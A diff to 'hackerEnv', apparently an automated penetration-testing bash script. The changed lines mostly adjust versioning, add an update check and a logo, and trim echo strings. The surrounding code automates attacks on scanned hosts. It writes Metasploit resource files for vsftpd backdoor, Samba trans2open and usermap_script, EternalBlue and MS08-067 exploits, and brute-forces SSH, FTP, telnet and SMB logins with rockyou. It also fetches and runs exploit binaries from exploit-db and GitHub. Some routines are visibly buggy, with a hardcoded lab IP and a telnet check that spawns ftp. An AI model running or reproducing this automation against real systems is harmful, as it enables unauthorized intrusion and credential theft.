@@ -6,7 +6,7 @@
 # By running this program, you are agreeing on NOT running it aginst any public, corporate or unauthorized networks. Performed only when you have authorization to do.
 
 #version major.minor.patch
-VER='0.2.0'
+VER='0.1.0'
 full_path=$(realpath $0) #/opt/hackerEnv/hackerEnv.sh
 dir_path=$(dirname $full_path) #/opt/hackerEnv
 BLUE='\e[1;34m'
@@ -14,22 +14,66 @@ RED='\e[1;91m'
 GREEN='\e[32m'
 BOLD='\e[1m'
 resetStyle='\e[0m'
-function updateOptWithVerbose() {
-	cd $dir_path
-	git fetch
-	git reset --hard > /dev/null 2>&1
-	git pull
-	chmod +x $full_path
-	cd - > /dev/null 2>&1
+
+function logo {
+	if ! command -v figlet > /dev/null 2>&1
+	then
+		apt install figlet -y > /dev/null 2>&1
+		figlet -t -f slant "hackerEnv"
+	else
+		figlet -t -f slant "hackerEnv"
+	fi
+	echo ""
+	echo -e "+ -- --=[hackerEnv v$VER by @abdulr7mann"
+    echo -e "+ -- --=[https://hackerEnv.com"
+	echo ""
 }
-function self_update() {
-	cd $dir_path
-	git fetch > /dev/null 2>&1
-	git reset --hard > /dev/null 2>&1
-	git pull > /dev/null 2>&1
-	chmod +x "$full_path"
-	cd - > /dev/null 2>&1
+
+function updateOptWithVerbose {
+	echo -e "+ -- --=[Checking for updates... "
+	if [ $(curl -s https://api.github.com/repos/abdulr7mann/hackerEnv/tags) = "" ]
+	then
+    	echo -e "$RED+ -- --=[Error: no active internet connection $RESET"
+    	echo ""
+    	exit 1
+  	fi
+  	LATEST_VERSION=$(curl -s https://api.github.com/repos/abdulr7mann/hackerEnv/tags | grep -Po '"name":.*?[^\\]",'| head -1 |cut -c11-15)
+  	if [ "$LATEST_VERSION" != "$VER" ] && [ "$LATEST_VERSION" != "" ]
+  	then
+   		echo -e "+ -- --=[hackerEnv v$LATEST_VERSION is available to download."
+   		echo -e "+ -- --=[Do you want to update hackerEnv [Y/n]:"
+    	read answer
+  		if [ "$answer" = "Y" ] || [ "$answer" = "y" ]
+  		then
+  			cd $dir_path || { echo -e "$COLOR1+ -- --=[Update Failed $RESET" ; exit 1 ; }
+			git fetch; git reset --hard; git pull || { echo -e "$RED+ -- --=[Couldn't download latest version $RESET" ; exit 1; }
+			git checkout $LATEST_VERSION 2> /dev/null
+			chmod +x $full_path
+			cd - 2> /dev/null
+  		else
+     		exit 1
+  		fi
+	else
+  		echo -e "+ -- --=[hackerEnv is already the latest version."
+  		echo ""
+	fi
 }
+#function updateOptWithVerbose() {
+#	cd $dir_path
+#	git fetch
+#	git reset --hard > /dev/null 2>&1
+#	git pull
+#	chmod +x $full_path
+#	cd - > /dev/null 2>&1
+#}
+#function self_update() {
+#	cd $dir_path
+#	git fetch > /dev/null 2>&1
+#	git reset --hard > /dev/null 2>&1
+#	git pull > /dev/null 2>&1
+#	chmod +x "$full_path"
+#	cd - > /dev/null 2>&1
+#}
 function cleanning(){
 if [ -f $dir_path/online.txt ] && [ -f $dir_path/online.txt ]
 then
@@ -50,8 +94,8 @@ fi
 }
 ################################ FTP #################################
 function vsftpd_234_backdoor(){
-	echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED Backdoor command execution $resetStyle "
-	echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+	echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED Backdoor command execution $resetStyle"
+	echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 	cat <<- vsftpd_234_backdoor > $dir_path/exploits/ftp/vsftpd_234_backdoor.rc
 		use exploit/unix/ftp/vsftpd_234_backdoor
 		set RHOSTS $ips
@@ -71,7 +115,7 @@ function vsftpd_234_backdoor(){
 	report2
 }
 function ftpAnonymous(){
-	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $resetStyle is $BOLD vulnerable $resetStyle to $RED ftp anonoymous login $resetStyle "
+	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $resetStyle is $BOLD vulnerable $resetStyle to $RED ftp anonoymous login $resetStyle"
 	cat <<- ftpAnony > $dir_path/exploits/ftp/ftpAnonymous.exp
 		#!/usr/bin/expect -f
 		spawn ftp $ips 
@@ -96,7 +140,7 @@ function ftpAnonymous(){
 }
 ############################## BruteForce #################################
 function sshBruteForce(){
-	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED SSH $resetStyle "
+	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED SSH $resetStyle"
 	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -123,7 +167,7 @@ function sshBruteForce(){
 			report2
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
-				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle "
+				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle"
 				cat <<- sshlogin > $dir_path/exploits/ssh/sshlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ssh $username@10.0.2.5 
@@ -152,7 +196,7 @@ function sshBruteForce(){
 	done < $ips/sshPass.txt
 }
 function ftpBruteForce(){
-	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED FTP $resetStyle "
+	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED FTP $resetStyle"
 	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -179,7 +223,7 @@ function ftpBruteForce(){
 			report2
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
-				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle "
+				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle"
 				cat <<- ftplogin > $dir_path/exploits/ftp/ftplogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
@@ -209,7 +253,7 @@ function ftpBruteForce(){
 	done < $ips/ftpPass.txt
 }
 function telnetBruteForce(){
-	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED TELNET $resetStyle "
+	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED TELNET $resetStyle"
 	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -236,7 +280,7 @@ function telnetBruteForce(){
 			report2
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
-				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle "
+				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle"
 				cat <<- telnetlogin > $dir_path/exploits/telnet/telnetlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
@@ -266,7 +310,7 @@ function telnetBruteForce(){
 	done < $ips/telnetPass.txt
 }
 function smbBruteForce(){
-	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED SMB $resetStyle "
+	echo -e "$BLUE Checking $resetStyle if $BOLD $ips $BOLD has $BOLD weak passwords $resetStyle against $RED SMB $resetStyle"
 	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -293,7 +337,7 @@ function smbBruteForce(){
 			report2
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
-				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle "
+				echo -e "Username: $GREEN $username $resetStyle Password: $GREEN $password $resetStyle"
 				cat <<- telnetlogin > $dir_path/exploits/telnet/telnetlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
@@ -323,8 +367,8 @@ function smbBruteForce(){
 	done < $ips/smbPass.txt
 }
 function OpenSSH4_7p1(){
-	echo -e "$ips has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED  brute force attacks against cryptographic keys $resetStyle "
-    echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+	echo -e "$ips has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED  brute force attacks against cryptographic keys $resetStyle"
+    echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 	if [ ! -f $dir_path/exploits/ssh/5622.tar.bz2 ]
 	then
 		wget -q -P $dir_path/exploits/ssh/ https://www.exploit-db.com/download/5632
@@ -365,8 +409,8 @@ function OpenSSH4_7p1(){
 }
 ################################ SMB #################################
 function trans2open(){
-	echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow $resetStyle "
-	echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+	echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow $resetStyle"
+	echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	cat <<- trans2open > $dir_path/exploits/smb/trans2open.rc
 		use exploit/linux/samba/trans2open
 		set RHOSTS $ips
@@ -393,8 +437,8 @@ function trans2open(){
 	report2
 }
 function usermap_script(){
-	echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED command execution $resetStyle "
-	echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+	echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED command execution $resetStyle"
+	echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	cat <<- usermap_script > $dir_path/exploits/smb/usermap_script.rc
 		use exploit/multi/samba/usermap_script
 		set RHOSTS $ips
@@ -429,16 +473,16 @@ function usermap_script(){
 function ms17_010_eternalblue(){
 	if [ "$smbVersion" != "" ]
 	then
-		echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow/remote code execution $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow/remote code execution $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	elif [ "$smbVersion" = "" ]
 	then
 		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
-		echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow/remote code execution $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow/remote code execution $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	else
-		echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED buffer overflow $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 	fi
 	cat <<- ms17_010_eternalblue > $dir_path/exploits/smb/ms17_010_eternalblue.rc
 		use exploit/windows/smb/ms17_010_eternalblue
@@ -485,16 +529,16 @@ function ms17_010_eternalblue(){
 function ms08_067_netapi(){
 	if [ "$smbVersion" != "" ]
 	then
-		echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	elif [ "$smbVersion" = "" ]
 	then
 		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
-		echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	else
-		echo -e " $BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle "
-		echo -e " $RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
+		echo -e "$BOLD $ips $resetStyle has $BOLD $smbVersion $resetStyle which is $BOLD vulnerable $resetStyle to $RED parsing flaw $resetStyle"
+		echo -e "$RED Exploiting $resetStyle $BOLD $smbVersion $resetStyle is in progress"
 	fi
 	cat <<- ms08_067_netapi > $dir_path/exploits/smb/ms08_067_netapi.rc
 		use exploit/windows/smb/ms08_067_netapi
@@ -701,20 +745,17 @@ function terminals(){
 	terminal=$t
 }
 ############################### Program starts here #####################
+logo
 terminals
+updateOptWithVerbose
+cleanning
+report
 if [ "$terminal" = "tmux" ]
 then
 	tmux rename-session hackerEnv
 	tmux rename-window -t 0 Pentesting
 fi
 
-
-if ! command -v figlet > /dev/null 2>&1
-then
-	apt install figlet -y > /dev/null 2>&1
-else
-	figlet -t -f slant "hackerEnv"
-fi
 
 if ! command -v gnome-terminal > /dev/null 2>&1
 then
@@ -732,8 +773,7 @@ then
 	git clone https://github.com/scipag/vulscan.git
 	cd -
 fi
-cleanning
-report
+
 ###############################################
 ###############################################
 ###############################################
@@ -853,16 +893,16 @@ else
 	ips="$(cat $dir_path/online.txt)"
 fi
 echo "Performing ping sweep is in progress"
-echo -e "Your ip address is $BOLD $ip $resetStyle "
+echo -e "Your ip address is $BOLD $ip $resetStyle"
 grep -vxFf $dir_path/urIp.txt $dir_path/online.txt > $dir_path/tmp.txt; cat $dir_path/tmp.txt > $dir_path/online.txt; rm $dir_path/tmp.txt
 while read ips
 do
 	packets=$(ping -c 1 $ips|grep 64|cut -f1-2 -d' ')
 	if [ "$packets" = "64 bytes" ]
 	then
-		echo -e " $BOLD $ips $resetStyle is $BLUE Online $resetStyle "
+		echo -e "$BOLD $ips $resetStyle is $BLUE Online $resetStyle"
 	else
-		echo -e " $BOLD $ips $resetStyle is $RED Offline $resetStyle "
+		echo -e "$BOLD $ips $resetStyle is $RED Offline $resetStyle"
 		sed -i "/$ips/d" $dir_path/online.txt
 	fi
 done < $dir_path/online.txt
@@ -874,7 +914,7 @@ do
 		rm -r $ips
 	fi
 	mkdir $ips
-	echo -e "Performing port scan on $BOLD $ips $resetStyle "
+	echo -e "Performing port scan on $BOLD $ips $resetStyle"
 	if [ "$aggressive" == true ]
 	then
 		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open --script nmap-vulners,vulscan --script-args vulscandb=exploitdb.csv -oA "$ips"/"$ips" $ips > /dev/null 2>&1
@@ -903,14 +943,14 @@ do
 	fi
 	if [ "$smbOS" != "ERROR: Script execution failed (use -d to debug)" ] && [ "$smbOS" != "" ]
 	then
-		echo -e "OS type: $BLUE $smbOS $resetStyle "
+		echo -e "OS type: $BLUE $smbOS $resetStyle"
 	elif [ "$ostype" != "" ]
 	then
-		echo -e "OS type: $BLUE $ostype: $osgen $resetStyle "
+		echo -e "OS type: $BLUE $ostype: $osgen $resetStyle"
 	else
-		echo -e "OS type: $BLUE Unknown $resetStyle "
+		echo -e "OS type: $BLUE Unknown $resetStyle"
 	fi
-	echo -e "Performing vulnerability scan on $BOLD $ips $resetStyle "
+	echo -e "Performing vulnerability scan on $BOLD $ips $resetStyle"
 	while read name
 	do
 		while read product
@@ -951,8 +991,8 @@ do
 ################   apache tomcat    ################################################################
 				if [ "$name" = "http" ] && [ "$product" = "Apache Tomcat/Coyote JSP engine" ] && [ "$version" = "1.1" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED remote code execution $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED remote code execution $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					port="$(cat $ips/$ips.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
 					if [ -f $dir_path/exploits/apache/tomcat_mgr_login.txt ]
 					then
@@ -1006,8 +1046,8 @@ do
 #############    apache Debian  ####################################################################
 				if [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.9" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1031,8 +1071,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.19" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1056,8 +1096,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.22" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1087,8 +1127,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.24" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1115,8 +1155,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.26" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1141,8 +1181,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.27" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1166,8 +1206,8 @@ do
 ##########    apache RedHat  ####################################################################
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1190,8 +1230,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.14" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.14" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1218,8 +1258,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.6.2" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.6.2" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1244,8 +1284,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.3" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1268,8 +1308,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1294,8 +1334,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.4" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.4" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1318,8 +1358,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.1.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.1.3" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1342,8 +1382,8 @@ do
 					fi
